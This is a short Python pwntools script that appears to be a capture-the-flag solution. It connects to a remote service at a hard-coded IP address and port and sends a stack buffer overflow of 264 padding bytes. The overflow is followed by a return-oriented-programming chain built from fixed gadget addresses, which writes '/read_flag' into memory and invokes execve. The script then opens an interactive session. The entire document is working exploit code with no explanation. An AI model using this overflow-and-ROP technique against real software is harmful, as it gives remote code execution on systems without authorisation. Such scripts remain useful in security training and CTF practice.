from pwn import *
import time
# sh = process("./release/app/app")
sh = remote("34.82.101.212",10011)
context.arch = 'amd64'

main = 0x400b4d
binsh_addr = 0x6bc080
pop_rdi = 0x400686
pop_rsi = 0x410083
pop_rdx = 0x449455
pop_rax = 0x415234
mov_rdi_rsi = 0x446bbb
syscall = 0x4011ec
rop = flat(pop_rdi,
           0x6bc000,
           pop_rsi,
           "/read_flag",
           mov_rdi_rsi,
           pop_rdx,
           0,
           pop_rsi,
           0,
           pop_rax,
           0x3b,
           syscall
          )
pause()
sh.sendline(b'a'*264+rop)
sh.interactive()

